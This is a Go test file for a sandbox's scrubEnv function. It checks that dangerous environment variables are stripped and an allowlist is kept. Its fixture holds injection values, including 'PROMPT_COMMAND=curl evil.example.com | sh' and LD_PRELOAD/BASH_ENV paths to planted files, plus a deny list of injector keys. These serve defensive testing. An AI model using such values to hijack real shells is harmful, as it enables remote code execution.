package sandbox

import "testing"

func TestScrubEnv_DropsInjectorsKeepsAllowlist(t *testing.T) {
	parent := []string{
		"PATH=/tmp/evil:/usr/bin",
		"HOME=/home/attacker",
		"TERM=xterm-256color",
		"LANG=en_US.UTF-8",
		"LD_PRELOAD=/tmp/evil.so",
		"LD_LIBRARY_PATH=/tmp/evil-libs",
		"BASH_ENV=/tmp/evil-rc",
		"ENV=/tmp/evil-rc2",
		"IFS=X",
		"SHELLOPTS=xtrace",
		"PROMPT_COMMAND=curl evil.example.com | sh",
		"PYTHIA_BASH_SANDBOX=off",
		"AWS_SECRET_ACCESS_KEY=super-secret",
		"SSH_AUTH_SOCK=/tmp/ssh-agent.sock",
	}

	got := scrubEnv(parent)

	want := map[string]string{
		"PATH": fixedPATH,
		"HOME": "/home/attacker",
		"TERM": "xterm-256color",
		"LANG": "en_US.UTF-8",
	}

	if len(got) != len(want) {
		t.Fatalf("scrubEnv(parent) = %v (len %d), want exactly %d entries: %v", got, len(got), len(want), want)
	}

	gotMap := toMap(t, got)
	for k, v := range want {
		gv, ok := gotMap[k]
		if !ok {
			t.Errorf("scrubEnv(parent) missing allowlisted key %q", k)
			continue
		}
		if gv != v {
			t.Errorf("scrubEnv(parent)[%q] = %q, want %q", k, gv, v)
		}
	}

	forbidden := []string{
		"LD_PRELOAD", "LD_LIBRARY_PATH", "BASH_ENV", "ENV", "IFS",
		"SHELLOPTS", "PROMPT_COMMAND", "PYTHIA_BASH_SANDBOX",
		"AWS_SECRET_ACCESS_KEY", "SSH_AUTH_SOCK",
	}
	for _, k := range forbidden {
		if _, ok := gotMap[k]; ok {
			t.Errorf("scrubEnv(parent) leaked forbidden key %q", k)
		}
	}
}

func TestScrubEnv_PathAlwaysFixedEvenIfParentUnset(t *testing.T) {
	parent := []string{
		"HOME=/home/user",
	}

	got := scrubEnv(parent)
	gotMap := toMap(t, got)

	pathVal, ok := gotMap["PATH"]
	if !ok {
		t.Fatal("scrubEnv(parent) did not set PATH even though parent had no PATH")
	}
	if pathVal != fixedPATH {
		t.Errorf("scrubEnv(parent)[PATH] = %q, want %q", pathVal, fixedPATH)
	}
	if pathVal != "/usr/bin:/bin" {
		t.Errorf("fixedPATH = %q, want the fixed constant /usr/bin:/bin", pathVal)
	}

	// HOME present in parent should pass through; TERM/LANG absent should
	// simply be omitted (not present with empty values).
	if v, ok := gotMap["HOME"]; !ok || v != "/home/user" {
		t.Errorf("scrubEnv(parent)[HOME] = %q, ok=%v, want \"/home/user\", ok=true", v, ok)
	}
	if _, ok := gotMap["TERM"]; ok {
		t.Errorf("scrubEnv(parent) set TERM even though parent had none")
	}
	if _, ok := gotMap["LANG"]; ok {
		t.Errorf("scrubEnv(parent) set LANG even though parent had none")
	}
}

func TestScrubEnv_EmptyParent_StillSetsFixedPath(t *testing.T) {
	got := scrubEnv(nil)
	gotMap := toMap(t, got)

	if len(gotMap) != 1 {
		t.Fatalf("scrubEnv(nil) = %v, want exactly 1 entry (PATH)", got)
	}
	if gotMap["PATH"] != fixedPATH {
		t.Errorf("scrubEnv(nil)[PATH] = %q, want %q", gotMap["PATH"], fixedPATH)
	}
}

func TestBashPath_IsAbsolute(t *testing.T) {
	if bashPath != "/bin/bash" {
		t.Errorf("bashPath = %q, want \"/bin/bash\"", bashPath)
	}
}

// toMap converts scrubEnv's KEY=VALUE slice output into a map for easy
// lookup in assertions, failing the test on any malformed entry.
func toMap(t *testing.T, env []string) map[string]string {
	t.Helper()
	m := make(map[string]string, len(env))
	for _, kv := range env {
		idx := -1
		for i, c := range kv {
			if c == '=' {
				idx = i
				break
			}
		}
		if idx < 0 {
			t.Fatalf("scrubEnv produced malformed entry %q (no '=')", kv)
		}
		k := kv[:idx]
		if _, dup := m[k]; dup {
			t.Fatalf("scrubEnv produced duplicate key %q", k)
		}
		m[k] = kv[idx+1:]
	}
	return m
}
